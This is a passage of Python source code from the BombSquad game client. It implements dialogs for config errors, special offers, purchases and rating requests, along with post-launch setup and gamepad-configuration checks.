        for call in gMainMenuResumeCallbacks:
            call()
        del gMainMenuResumeCallbacks[:]

class ConfigErrorWindow(Window):

    def __init__(self):

        self._configFilePath = bs.getEnvironment()['configFilePath']
        width = 800
        self._rootWidget = bs.containerWidget(
            size=(width, 300), transition='inRight')
        padding = 20
        t = bs.textWidget(
            parent=self._rootWidget, position=(padding, 220),
            size=(width - 2 * padding, 100 - 2 * padding),
            hAlign="center", vAlign="top", scale=0.73,
            text=("Error reading BombSquad config file:\n\n\nCheck the console"
                  " (press ~ twice) for details.\n\nWould you like to quit and"
                  " try to fix it by hand\nor overwrite it with defaults?\n\n"
                  "(high scores, player profiles, etc will be lost if you"
                  " overwrite)"))
        t2 = bs.textWidget(
            parent=self._rootWidget, position=(padding, 198),
            size=(width - 2 * padding, 100 - 2 * padding),
            hAlign="center", vAlign="top", scale=0.5, text=self._configFilePath)
        quitButton = bs.buttonWidget(
            parent=self._rootWidget, position=(35, 30),
            size=(240, 54),
            label="Quit and Edit", onActivateCall=self._quit)
        b = bs.buttonWidget(
            parent=self._rootWidget, position=(width - 370, 30),
            size=(330, 54),
            label="Overwrite with Defaults", onActivateCall=self._defaults)
        bs.containerWidget(
            edit=self._rootWidget, cancelButton=quitButton,
            selectedChild=quitButton)

    def _quit(self):
        bs.realTimer(1, self._editAndQuit)
        bsInternal._lockAllInput()

    def _editAndQuit(self):
        bsInternal._openFileExternally(self._configFilePath)
        bs.realTimer(100, bs.quit)

    def _defaults(self):
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        bs.playSound(bs.getSound('gunCocking'))
        bs.screenMessage("settings reset.", color=(1, 1, 0))
        # at this point settings are already set; lets just commit them
        # to disk..
        bs.writeConfig(force=True)


class SpecialOfferWindow(Window):

    def __init__(self, offer, transition='inRight'):

        self._cancelDelay = offer.get('cancelDelay', 0)

        # first thing: if we're offering pro or an IAP, see if we have a
        # price for it.
        # if not, abort and go into zombie mode (the user should never see
        # us that way)

        # (misnomer; 'pro' actually means offer 'pro_sale')
        if offer['item'] in ['pro', 'pro_fullprice']:
            realPrice = bsInternal._getPrice(
                'pro' if offer['item'] == 'pro_fullprice' else 'pro_sale')
            if realPrice is None and bs.getEnvironment()['debugBuild']:
                print 'TEMP FAKING REAL PRICE'
                realPrice = '$1.23'
            zombie = True if realPrice is None else False
        elif type(offer['price']) is str:  # a string price implies IAP id..
            realPrice = bsInternal._getPrice(offer['price'])
            zombie = True if realPrice is None else False
        else:
            realPrice = None
            zombie = False
        if realPrice is None:
            realPrice = '?'

        if offer['item'] in ['pro', 'pro_fullprice']:
            self._offer_item = 'pro'
        else:
            self._offer_item = offer['item']

        # if we wanted a real price but didn't find one, go zombie..
        if zombie:
            return

        # this can pop up suddenly, so lets block input for 1 second...
        bsInternal._lockAllInput()
        bs.realTimer(1000, bsInternal._unlockAllInput)

        bs.playSound(bs.getSound('ding'))
        bs.realTimer(300, lambda: bs.playSound(bs.getSound('ooh')))

        self._offer = copy.deepcopy(offer)

        self._width = width = 580
        self._height = height = 590

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition=transition, scale=1.2
            if gSmallUI else 1.15 if gMedUI else 1.0, stackOffset=(0, -15)
            if gSmallUI else(0, 0))

        self._isBundleSale = False

        try:
            if offer['item'] in ['pro', 'pro_fullprice']:
                originalPriceStr = bsInternal._getPrice('pro')
                if originalPriceStr is None:
                    originalPriceStr = '?'
                newPriceStr = bsInternal._getPrice('pro_sale')
                if newPriceStr is None:
                    newPriceStr = '?'
                percentOffText = ''
            else:
                # if the offer includes bonus tickets it's a bundle-sale
                if ('bonusTickets' in offer
                        and offer['bonusTickets'] is not None):
                    self._isBundleSale = True
                originalPrice = bsInternal._getAccountMiscReadVal(
                    'price.' + self._offer_item, 9999)
                newPrice = offer['price']
                tChar = bs.getSpecialChar('ticket')
                originalPriceStr = tChar+str(originalPrice)
                newPriceStr = tChar+str(newPrice)
                percentOff = int(
                    round(
                        100.0 - (float(newPrice) / originalPrice) *
                        100.0))
                percentOffText = ' ' + bs.Lstr(
                    resource='store.salePercentText').evaluate().replace(
                    '${PERCENT}', str(percentOff))
        except Exception:
            originalPriceStr = newPriceStr = '?'
            percentOffText = ''

        # if its a bundle sale, change the title
        if self._isBundleSale:
            saleText = bs.Lstr(
                resource='store.saleBundleText',
                fallbackResource='store.saleText').evaluate()
        else:
            # for full pro we say 'Upgrade?' since its not really a sale...
            if offer['item'] == 'pro_fullprice':
                saleText = bs.Lstr(
                    resource='store.upgradeQuestionText',
                    fallbackResource='store.saleExclaimText').evaluate()
            else:
                saleText = bs.Lstr(
                    resource='store.saleExclaimText',
                    fallbackResource='store.saleText').evaluate()

        self._titleText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 40),
            size=(0, 0),
            text=saleText +
            ((' ' + bs.Lstr(resource='store.oneTimeOnlyText').evaluate())
             if self._offer['oneTimeOnly'] else '') + percentOffText,
            hAlign='center', vAlign='center', maxWidth=self._width * 0.9 - 220,
            scale=1.4, color=(0.3, 1, 0.3))

        self._flashOn = False
        self._flashingTimer = bs.Timer(
            50, bs.WeakCall(self._flashCycle),
            repeat=True, timeType='real')
        bs.realTimer(600, bs.WeakCall(self._stopFlashing))

        size = _getStoreItemDisplaySize(self._offer_item)
        display = {}
        _instantiateStoreItemDisplay(
            self._offer_item, display, parentWidget=self._rootWidget,
            bPos=(self._width * 0.5 - size[0] * 0.5 + 10 -
                  ((size[0] * 0.5 + 30) if self._isBundleSale else 0),
                  self._height * 0.5 - size[1] * 0.5 + 20 +
                  (20 if self._isBundleSale else 0)),
            bWidth=size[0],
            bHeight=size[1],
            button=False if self._isBundleSale else True)
        # wire up the parts we need..
        if self._isBundleSale:
            self._plusText = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5, self._height * 0.5 + 50),
                size=(0, 0),
                text='+', hAlign='center', vAlign='center', maxWidth=self.
                _width * 0.9, scale=1.4, color=(0.5, 0.5, 0.5))
            self._plusTickets = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5 + 120, self._height * 0.5 + 50),
                size=(0, 0),
                text=bs.getSpecialChar('ticketBacking') +
                str(offer['bonusTickets']),
                hAlign='center', vAlign='center', maxWidth=self._width * 0.9,
                scale=2.5, color=(0.2, 1, 0.2))
            self._priceText = bs.textWidget(
                parent=self._rootWidget, position=(self._width * 0.5, 150),
                size=(0, 0),
                text=realPrice, hAlign='center', vAlign='center',
                maxWidth=self._width * 0.9, scale=1.4, color=(0.2, 1, 0.2))
            # total-value if they supplied it
            totalWorthItem = offer.get('valueItem', None)
            if totalWorthItem is not None:
                totalWorthPrice = _getCleanPrice(
                    bsInternal._getPrice(totalWorthItem))
                if totalWorthPrice is not None:
                    totalWorthText = bs.Lstr(
                        resource='store.totalWorthText',
                        subs=[('${TOTAL_WORTH}', totalWorthPrice)])
                    self._totalWorthText = bs.textWidget(
                        parent=self._rootWidget, text=totalWorthText,
                        position=(self._width * 0.5, 210),
                        scale=0.9, maxWidth=self._width * 0.7, size=(0, 0),
                        hAlign='center', vAlign='center', shadow=1.0,
                        flatness=1.0, color=(0.3, 1, 1))

        elif offer['item'] == 'pro_fullprice':
            # for full-price pro we simply show full price
            bs.textWidget(edit=display['priceWidget'], text=realPrice)
            bs.buttonWidget(
                edit=display['button'],
                onActivateCall=self._purchase)
        else:
            # show old/new prices otherwise (for pro sale)
            bs.buttonWidget(
                edit=display['button'],
                onActivateCall=self._purchase)
            bs.imageWidget(edit=display['priceSlashWidget'], opacity=1.0)
            bs.textWidget(
                edit=display['priceWidgetLeft'],
                text=originalPriceStr)
            bs.textWidget(edit=display['priceWidgetRight'], text=newPriceStr)

        # add ticket button only if this is ticket-purchasable
        if offer['price'] is not None and type(offer['price']) is int:
            self._getTicketsButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(self._width-125, self._height-68),
                size=(90, 55), scale=1.0,
                buttonType='square',
                color=(0.7, 0.5, 0.85),
                textColor=(0.2, 1, 0.2),
                autoSelect=True,
                label=bs.Lstr(resource='getTicketsWindow.titleText'),
                onActivateCall=self._on_get_more_tickets_press)

            self._ticketTextUpdateTimer = bs.Timer(
                1000, bs.WeakCall(self._updateTicketsText),
                timeType='real', repeat=True)
            self._updateTicketsText()

        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)

        self._cancelButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(50, 40)
            if self._isBundleSale else(self._width * 0.5 - 75, 40),
            size=(150, 60),
            scale=1.0, onActivateCall=self._cancel, autoSelect=True,
            label=bs.Lstr(resource='noThanksText'))
        self._cancelCountdownText = bs.textWidget(
            parent=self._rootWidget, text='', position=(50 + 150 + 20, 40 + 27)
            if self._isBundleSale
            else(self._width * 0.5 - 75 + 150 + 20, 40 + 27),
            scale=1.1, size=(0, 0),
            hAlign='left', vAlign='center', shadow=1.0, flatness=1.0,
            color=(0.6, 0.5, 0.5))
        self._updateCancelButtonGraphics()

        if self._isBundleSale:
            self._purchaseButton = b = bs.buttonWidget(
                parent=self._rootWidget, position=(self._width - 200, 40),
                size=(150, 60),
                scale=1.0, onActivateCall=self._purchase, autoSelect=True,
                label=bs.Lstr(resource='store.purchaseText'))

        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=self._cancelButton,
                           startButton=self._purchaseButton
                           if self._isBundleSale else None,
                           selectedChild=self._purchaseButton
                           if self._isBundleSale else display['button'])

    def _stopFlashing(self):
        self._flashingTimer = None
        bs.textWidget(edit=self._titleText,
                      color=(0.3, 1, 0.3))

    def _flashCycle(self):
        if not self._rootWidget.exists():
            return
        self._flashOn = not self._flashOn
        bs.textWidget(edit=self._titleText,
                      color=(0.3, 1, 0.3) if self._flashOn else (1, 0.5, 0))

    def _updateCancelButtonGraphics(self):
        bs.buttonWidget(
            edit=self._cancelButton, color=(0.5, 0.5, 0.5)
            if self._cancelDelay > 0 else(0.7, 0.4, 0.34),
            textColor=(0.5, 0.5, 0.5)
            if self._cancelDelay > 0 else(0.9, 0.9, 1.0))
        bs.textWidget(edit=self._cancelCountdownText, text=str(
            self._cancelDelay) if self._cancelDelay > 0 else '')

    def _update(self):

        # if we've got seconds left on our countdown, update it..
        if self._cancelDelay > 0:
            self._cancelDelay = max(0, self._cancelDelay - 1)
            self._updateCancelButtonGraphics()

        canDie = False

        # we go away if we see that our target item is owned..
        if self._offer_item == 'pro':
            if bsUtils._havePro():
                canDie = True
        else:
            if bsInternal._getPurchased(self._offer_item):
                canDie = True

        if canDie:
            self._transitionOut('outLeft')

    def _transitionOut(self, transition='outLeft'):

        # also clear any pending-special-offer we've stored at this point
        cfg = bs.getConfig()
        if 'pendingSpecialOffer' in cfg:
            del cfg['pendingSpecialOffer']
            bs.writeConfig()

        bs.containerWidget(edit=self._rootWidget, transition=transition)

    def _updateTicketsText(self):
        if not self._rootWidget.exists():
            return
        if bsInternal._getAccountState() == 'SIGNED_IN':
            s = bs.getSpecialChar(
                'ticket')+str(bsInternal._getAccountTicketCount())
        else:
            s = bs.Lstr(resource='getTicketsWindow.titleText')
        bs.buttonWidget(edit=self._getTicketsButton, label=s)

    def _on_get_more_tickets_press(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        window = GetTicketsWindow(modal=True).getRootWidget()

    def _purchase(self):

        if self._offer['item'] == 'pro':
            bsInternal._purchase('pro_sale')
        elif self._offer['item'] == 'pro_fullprice':
            bsInternal._purchase('pro')
        elif self._isBundleSale:
            # with bundle sales, the price is the name of the IAP
            bsInternal._purchase(self._offer['price'])
        else:
            try:
                ticketCount = bsInternal._getAccountTicketCount()
            except Exception:
                ticketCount = None
            if ticketCount is not None and ticketCount < self._offer['price']:
                showGetTicketsPrompt()
                bs.playSound(bs.getSound('error'))
                return

            def doIt():
                bsInternal._inGamePurchase(
                    'offer:' + str(self._offer['id']),
                    self._offer['price'])
            bs.playSound(bs.getSound('swish'))
            ConfirmWindow(
                bs.Lstr(
                    resource='store.purchaseConfirmText',
                    subs=[('${ITEM}',
                           _getStoreItemNameTranslated(
                               self._offer['item']))]),
                width=400, height=120, action=doIt, okText=bs.Lstr(
                    resource='store.purchaseText', fallbackResource='okText'))

    def _cancel(self):
        if self._cancelDelay > 0:
            bs.playSound(bs.getSound('error'))
            return
        self._transitionOut('outRight')


class PurchaseWindow(Window):

    def __init__(self, items, transition='inRight', headerText=None):

        if headerText is None:
            headerText = bs.Lstr(
                resource='unlockThisText',
                fallbackResource='unlockThisInTheStoreText')

        if len(items) != 1:
            raise Exception('expected exactly 1 item')

        self._items = list(items)

        self._width = width = 580
        self._height = height = 520

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition=transition, toolbarVisibility='MENU_CURRENCY', scale=1.2
            if gSmallUI else 1.1 if gMedUI else 1.0, stackOffset=(0, -15)
            if gSmallUI else(0, 0))

        self._isDouble = False

        self._titleText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 30),
            size=(0, 0),
            text=headerText, hAlign='center', vAlign='center',
            maxWidth=self._width * 0.9 - 120, scale=1.2, color=(1, 0.8, 0.3, 1))

        size = _getStoreItemDisplaySize(items[0])
        display = {}
        _instantiateStoreItemDisplay(
            items[0],
            display, parentWidget=self._rootWidget,
            bPos=(self._width * 0.5 - size[0] * 0.5 + 10 -
                  ((size[0] * 0.5 + 30) if self._isDouble else 0),
                  self._height * 0.5 - size[1] * 0.5 + 30 +
                  (20 if self._isDouble else 0)),
            bWidth=size[0],
            bHeight=size[1],
            button=False)
        # wire up the parts we need..
        if self._isDouble:
            self._plusText = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5, self._height * 0.5 + 50),
                size=(0, 0),
                text='+', hAlign='center', vAlign='center', maxWidth=self.
                _width * 0.9, scale=1.4, color=(0.5, 0.5, 0.5))
            self._plusTickets = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5 + 120, self._height * 0.5 + 50),
                size=(0, 0),
                text=bs.getSpecialChar('ticketBacking') +
                str(offer['bonusTickets']),
                hAlign='center', vAlign='center', maxWidth=self._width * 0.9,
                scale=2.5, color=(0.2, 1, 0.2))
            # color=(1,0.5,0))
            self._priceText = bs.textWidget(
                parent=self._rootWidget, position=(self._width * 0.5, 150),
                size=(0, 0),
                text=realPrice, hAlign='center', vAlign='center',
                maxWidth=self._width * 0.9, scale=1.4, color=(0.2, 1, 0.2))
            # color=(1,0.5,0))
        else:
            if self._items == ['pro']:
                priceStr = bsInternal._getPrice(self._items[0])
                pyoffs = -15
            else:
                pyoffs = 0
                price = self._price = bsInternal._getAccountMiscReadVal(
                    'price.'+str(items[0]), -1)
                priceStr = bs.getSpecialChar('ticket')+str(price)
            self._priceText = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5, 150 + pyoffs),
                size=(0, 0),
                text=priceStr, hAlign='center', vAlign='center',
                maxWidth=self._width * 0.9, scale=1.4, color=(0.2, 1, 0.2))
            # color=(1,0.5,0))

        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)

        self._cancelButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(50, 40),
            size=(150, 60),
            scale=1.0, onActivateCall=self._cancel, autoSelect=True,
            label=bs.Lstr(resource='cancelText'))
        self._purchaseButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(self._width - 200, 40),
            size=(150, 60),
            scale=1.0, onActivateCall=self._purchase, autoSelect=True,
            label=bs.Lstr(resource='store.purchaseText'))

        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=self._cancelButton,
                           startButton=self._purchaseButton,
                           selectedChild=self._purchaseButton)

    def _update(self):

        canDie = False

        # we go away if we see that our target item is owned..
        if self._items == ['pro']:
            if bsUtils._havePro():
                canDie = True
        else:
            if bsInternal._getPurchased(self._items[0]):
                canDie = True

        if canDie:
            bs.containerWidget(edit=self._rootWidget, transition='outLeft')

    def _purchase(self):

        if self._items == ['pro']:
            bsInternal._purchase('pro')
        else:
            try:
                ticketCount = bsInternal._getAccountTicketCount()
            except Exception:
                ticketCount = None
            if ticketCount is not None and ticketCount < self._price:
                showGetTicketsPrompt()
                bs.playSound(bs.getSound('error'))
                return

            def doIt():
                bsInternal._inGamePurchase(self._items[0], self._price)
            bs.playSound(bs.getSound('swish'))
            doIt()

    def _cancel(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')


gSpecialOffer = None


def _showOffer():
    try:
        global gSpecialOffer

        # space things out a bit so we don't hit the poor user with an ad and
        # then an in-game offer...
        hasBeenLongEnoughSinceAd = True
        if bsUtils._lastAdCompletionTime is not None and(
                bs.getRealTime() - bsUtils._lastAdCompletionTime < 30 * 1000):
            hasBeenLongEnoughSinceAd = False

        if gSpecialOffer is not None and hasBeenLongEnoughSinceAd:

            # special case - for pro offers, store this in our prefs so we
            # can re-show it if the user
            # kills us (maximum nag power!!!)
            if gSpecialOffer.get('item') == 'pro_fullprice':
                cfg = bs.getConfig()
                cfg['pendingSpecialOffer'] = {
                    'a': bsInternal._get_public_login_id(),
                    'o': gSpecialOffer}
                bs.writeConfig()

            with bs.Context('UI'):
                if gSpecialOffer['item'] == 'rating':
                    askForRating()
                else:
                    offer = gSpecialOffer

                    def doIt():
                        try:
                            if offer['item'] == 'pro':
                                bsInternal._purchase('pro_sale')
                            else:
                                bsInternal._inGamePurchase(
                                    'offer:' + str(offer['id']),
                                    offer['price'])
                        except Exception:
                            bs.printException('Error running special offer')
                    SpecialOfferWindow(gSpecialOffer)

            gSpecialOffer = None
            return True
    except Exception:
        bs.printException('Error showing offer')

    return False


def askForRating():
    env = bs.getEnvironment()
    platform = env['platform']
    subplatform = env['subplatform']
    if not(platform == 'mac'
           or (platform == 'android'
               and subplatform in ['google', 'cardboard'])):
        return
    width = 700
    height = 400
    spacing = 40
    d = bs.containerWidget(
        size=(width, height),
        transition='inRight', scale=1.6
        if gSmallUI else 1.35 if gMedUI else 1.0)
    v = height - 50
    v -= spacing
    v -= 140
    w = bs.imageWidget(parent=d, position=(width/2-100, v+10), size=(200, 200),
                       texture=bs.getTexture("cuteSpaz"))
    t = bs.textWidget(
        parent=d, position=(15, v - 55),
        size=(width - 30, 30),
        color=gInfoTextColor, text=bs.Lstr(
            resource='pleaseRateText',
            subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]),
        maxWidth=width * 0.95, maxHeight=130, scale=0.85, hAlign="center",
        vAlign="center")

    def doRating():

        # doing this in a timer seems to keep bombsquad from maintaining focus
        if platform == 'android':
            if subplatform == 'google':
                url = 'market://details?id=net.froemling.bombsquad'
            else:
                url = 'market://details?id=net.froemling.bombsquadcb'
        else:
            url = 'macappstore://itunes.apple.com/app/id416482767?ls=1&mt=12'

        bs.openURL(url)
        bs.containerWidget(edit=d, transition='outLeft')

    b = bs.buttonWidget(parent=d, position=(60, 20), size=(200, 60),
                        label=bs.Lstr(resource='wellSureText'),
                        autoSelect=True,
                        onActivateCall=doRating)

    def close():
        bs.containerWidget(edit=d, transition='outLeft')

    b = bs.buttonWidget(parent=d, position=(width - 270, 20), size=(200, 60),
                        label=bs.Lstr(resource='noThanksText'),
                        autoSelect=True,
                        onActivateCall=close)
    bs.containerWidget(edit=d, cancelButton=b, selectedChild=b)
    return d


def runPostLaunchStuff():

    env = bs.getEnvironment()
    bsConfig = bs.getConfig()

    # first off, if there's a leftover log file, attempt to upload
    # it to the server and/or get rid of it..
    try:
        import ast
        if os.path.exists(bsInternal._getLogFilePath()):
            f = open(bsInternal._getLogFilePath())
            info = ast.literal_eval(f.read())
            f.close()
            doSend = bsUtils._shouldSubmitDebugInfo()

            if doSend:
                def response(data):
                    # non-None response means we were succesful; lets kill it.
                    if data is not None:
                        os.remove(bsInternal._getLogFilePath())
                bsUtils.serverPut('bsLog', info, response)
            else:
                # if they dont want logs uploaded just kill it
                os.remove(bsInternal._getLogFilePath())
    except Exception:
        bs.printException('Error handling leftover log file')

    # notify the user if we're using custom system scripts:
    if env['systemScriptsDirectory'] != 'data/scripts':
        bs.screenMessage("Using custom system scripts...", color=(0, 1, 0))

    # (only do this stuff if our config file is healthy so we dont
    # overwrite a broken one or whatnot and wipe out data)
    if not bsUtils.gConfigFileIsHealthy:
        ua = env['userAgentString']
        if 'Mac' in ua or 'linux' in ua or 'windows' in ua:
            ConfigErrorWindow()
            return
        else:
            # for now on other systems we just overwrite the bum config
            # at this point settings are already set; lets just commit them
            # to disk..
            bs.writeConfig(force=True)

    # if we're using a non-default playlist lets go ahead and get
    # our music-player going since it may hitch
    # (better while we're faded out than later)
    try:
        if 'Soundtrack' in bsConfig and bsConfig['Soundtrack'] not in [
                '__default__', 'Default Soundtrack']:
            bsUtils.getMusicPlayer()
    except Exception:
        bs.printException('error prepping music-player')

    launchCount = bsConfig.get('launchCount', 0)
    launchCount += 1

    for key in ('lc14', 'lc14c', 'lc14146', 'lc14173', 'lc14292'):
        bsConfig.setdefault(key, launchCount)

    # debugging - make note if we're using the local test server so we
    # dont accidentally leave it on in a release
    server_addr = bsInternal._get_master_server_address()
    if 'localhost' in server_addr:
        bs.realTimer(
            2000, bs.Call(
                bs.screenMessage, "Note: using local server", (1, 1, 0),
                log=True))
    elif 'test' in server_addr:
        bs.realTimer(
            2000, bs.Call(
                bs.screenMessage, "Note: using test server-module", (1, 1, 0),
                log=True))

    gamePadConfigQueryDelay = 1000

    platform = env['platform']
    subplatform = env['subplatform']

    # ask if we can submit debug info
    try:
        canDebug = bsConfig['Submit Debug Info']
    except Exception:
        canDebug = True

    # update - just gonna enable this for now and put a disable
    # option in advanced settings or whatnot..
    forceTest3 = False

    # lets make a list of unconfigured joysticks so if we're sitting idle
    # we can ask the user to config them
    global gUntestedGamePads
    gUntestedGamePads += bsInternal._getConfigurableGamePads()

    # if there's any gamepads in there, set up our timer to go through them..
    if len(gUntestedGamePads) > 0:
        bs.realTimer(gamePadConfigQueryDelay, _setupGamePadConfigTimer)

    bsConfig['launchCount'] = launchCount

    # write out our config in a few seconds.. this delay gives a little time
    # for cloud settings to come in so we're less likely to inadvertantly
    # overwrite cloud values with stale old values of ours and stuff..
    bs.realTimer(5000, bs.writeConfig)

    # run a test in a few seconds to see if we should pop up an old pending
    # special offer
    def checkSpecialOffer():
        cfg = bs.getConfig()
        if ('pendingSpecialOffer' in cfg
                and bsInternal._get_public_login_id() == \
                cfg['pendingSpecialOffer']['a']):
            global gSpecialOffer
            gSpecialOffer = cfg['pendingSpecialOffer']['o']
            _showOffer()
    bs.realTimer(3000, checkSpecialOffer)

    # lets go ahead and scan our games to avoid hitches later
    bsUtils.getGameTypes()

    # auto-sign-in to a local account in a moment if we're set to..
    def doAutoSignIn():
        if bs.getEnvironment()['subplatform'] == 'headless':
            bsInternal._signIn('Local')
        elif bsConfig.get('Auto Account State') == 'Local':
            bsInternal._signIn('Local')
    bs.realTimer(1, doAutoSignIn)

    bsUtils._gRanPostLaunchStuff = True


def checkGamePadConfigs():
    """can be called during idle time to ask the
    user to configure any unconfigured joysticks
    """

    global gCanAskToConfigGamePads

    # go through the list until we find one we ask about or we have to
    # stop asking
    while len(gUntestedGamePads) > 0 and gCanAskToConfigGamePads:

        gamepad = gUntestedGamePads.pop()

        # ok lets just ask for a button assignment for this joystick..
        # if we dont get anything back lets ask the user if they want
        # to configure it..
        try:
            getControllerValue(gamepad, "buttonJump", exceptionOnUnknown=True)
            known = True
        except Exception:
            known = False

        # in some cases we dont bother asking (if it looks like its a
        # keyboard or a mouse that just happens to be showing up as a joystick)
        ask = True
        try:
            name = gamepad.getName().lower()
            if any(
                (s in name
                 for s
                 in
                 ['mouse', 'keyboard', 'athome_remote', 'cec_input',
                  'alitv gamepad'])):
                ask = False

        except Exception as e:
            print 'EXC checking gp name', e
            ask = False

        # FIXME - if ask is false we should maybe still ask the server
        # for the config
        if not known and ask:

            def askToConfig():
                try:
                    name = gamepad.getName()
                except Exception:
                    name = None

                # COMPLETELY DISABLING THIS FOR NOW
                # ..there's just too many funky corner cases where this can
                # pop up at inopportune times or get hidden behind the
                # main menu or whatnot ..maybe can revisit later.
                return

                # only proceed if we can get its name
                if name is not None:
                    bs.playSound(bs.getSound('swish'))
                    # dont ask about more while we're configing this one..
                    global gCanAskToConfigGamePads
                    gCanAskToConfigGamePads = False

                    width = 600
                    height = 200
                    spacing = 40
                    d = bs.containerWidget(
                        scale=1.8 if gSmallUI else 1.4 if gMedUI else 1.0,
                        size=(width, height),
                        transition='inRight')

                    v = height - 60
                    t = bs.textWidget(
                        parent=d, position=(15, v),
                        size=(width - 30, 30),
                        color=gInfoTextColor, text=bs.Lstr(
                            resource='unconfiguredControllerDetectedText'),
                        scale=0.8, hAlign="center", vAlign="top")
                    v -= 30
                    t = bs.textWidget(
                        parent=d, position=(15, v),
                        size=(width - 30, 30),
                        color=(1, 1, 1, 1.0),
                        text=name, hAlign="center", vAlign="top")
                    v -= 30
                    t = bs.textWidget(
                        parent=d, position=(15, v),
                        size=(width - 30, 30),
                        color=gInfoTextColor, text=bs.Lstr(
                            resource='configureItNowText'),
                        scale=0.8, hAlign="center", vAlign="top")

                    def doConfigure(gamepad):
                        bs.containerWidget(edit=d, transition='outLeft')
                        GamePadConfigWindow(gamepad, isMainMenu=False)

                    b = bs.buttonWidget(
                        parent=d, position=(20, 20), size=(200, 60),
                        label=bs.Lstr(resource='configureText'),
                        onActivateCall=bs.Call(doConfigure, gamepad))

                    def close():
                        bs.containerWidget(edit=d, transition='outLeft')

                        # if they dont wanna configure now, lets cancel all..
                        global gUntestedGamePads
                        gUntestedGamePads = []

                        # ok can go back to asking now..
                        global gCanAskToConfigGamePads
                        gCanAskToConfigGamePads = True

                    b = bs.buttonWidget(
                        parent=d, position=(width - 230, 20),
                        size=(200, 60),
                        label=bs.Lstr(resource='notNowText'),
                        onActivateCall=close)

            def cb(data):
                global gCanAskToConfigGamePads
                gCanAskToConfigGamePads = True

                try:
                    name = gamepad.getName()
                except Exception:
                    name = None

                haveConfig = False

                if data:
                    if data.get('config') is not None and name is not None:
                        # if there's currently no default config entry,
                        # write this one
                        configLoc = getConfigLocationForInputDevice(
                            gamepad, default=True)
                        configDict = configLoc[0][configLoc[1]]
                        if len(configDict) == 0:
                            configLoc[0][
                                configLoc[1]] = copy.deepcopy(
                                data['config'])
                            haveConfig = True
                            bs.applySettings()
                            bs.writeConfig()
                    elif name is not None:
                        # server got our request but didn't have a config
                        # for us; make note locally so we don't keep
                        # asking about it
                        configChecks = bs.getConfig().setdefault(
                            'Controller Config Checks', {})
                        configChecks[name] = {}
                        bs.writeConfig()

                # finally if we still have no config, possibly ask the user..
                if not haveConfig:
                    askToConfig()

            # if we can get its name, ask the server about it
            # we include our input-map-hash so that differently mapped systems
            # will return different sets of results
            try:
                name = gamepad.getName()
            except Exception:
                name = None
            if name is not None:
                configChecks = bs.getConfig().get(
                    'Controller Config Checks', {})
                if name not in configChecks:
                    gCanAskToConfigGamePads = False  # lock waiting for response
                    bsUtils.serverGet(
                        'controllerConfig',
                        {'ua': bs.getEnvironment()['userAgentString'],
                         'name': name,
                         'inputMapHash': getInputMapHash(gamepad)},
                        callback=cb)

    # ok, lastly, if there's no more gamepads to ask about, lets kill our timer
    if len(gUntestedGamePads) == 0:
        global gGamePadConfigQueryTimer
        gGamePadConfigQueryTimer = None


def _setupGamePadConfigTimer():
    # make/rename a timer to periodically ask about gamepads until none are left
    global gGamePadConfigQueryTimer
    gGamePadConfigQueryTimer = bs.Timer(
        1000, checkGamePadConfigs, repeat=True, timeType='real')


# hmm should we generalize this a bit more?...
# (ie; any input device; not just configurable gamepads)
def _onConfigurableGamePadConnected(inputDevice):
    # put this on the list so we can offer to config it if its not..
    gUntestedGamePads.append(inputDevice)
    _setupGamePadConfigTimer()


class KioskWindow(Window):
    def __init__(self, transition='inRight'):

        self._width = 720
        self._height = 340
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition=transition, onCancelCall=bs.Call(
                QuitWindow, swish=True, back=True),
            background=False, stackOffset=(0, -130))

        self._r = 'kioskWindow'

        self._showMultiplayer = False

        # alter some default behavior when going through this menu..
        bsUtils.gRunningKioskModeGame = True

        # lets reset all random player names every time we hit the main menu
        bsInternal._resetRandomPlayerNames()

        # and achievements.. (at least locally)
        bs.getConfig()['Achievements'] = {}

        global gDidMenuIntro
        tDelayBase = 0
        tDelayScale = 0
        if gDidMenuIntro == False:
            tDelayBase = 1000
            tDelayScale = 1.0

        modelOpaque = bs.getModel('levelSelectButtonOpaque')
        modelTransparent = bs.getModel('levelSelectButtonTransparent')
        maskTex = bs.getTexture('mapPreviewMask')

        yExtra = 130 + (0 if self._showMultiplayer else -130)
        bWidth = 250
        bHeight = 200
        bSpace = 280
        bV = 80+yExtra
        labelHeight = 130+yExtra
        imgWidth = 180
        imgV = 158+yExtra

        if self._showMultiplayer:
            tDelay = tDelayBase+tDelayScale*1300
            bs.textWidget(
                parent=self._rootWidget, size=(0, 0),
                position=(self._width * 0.5, self._height + yExtra - 44),
                transitionDelay=tDelay, text=bs.Lstr(
                    resource=self._r + '.singlePlayerExamplesText'),
                flatness=1.0, scale=1.2, hAlign='center', vAlign='center',
                shadow=1.0)
        else:
            tDelay = tDelayBase+tDelayScale*700
            bs.textWidget(
                parent=self._rootWidget, size=(0, 0),
                position=(self._width * 0.5, self._height + yExtra - 34),
                transitionDelay=tDelay, text=bs.Lstr(
                    resource='demoText',
                    fallbackResource='mainMenu.demoMenuText'),
                flatness=1.0, scale=1.2, hAlign='center', vAlign='center',
                shadow=1.0)
        h = self._width*0.5-bSpace
        tDelay = tDelayBase+tDelayScale*700
        self._b1 = b = bs.buttonWidget(
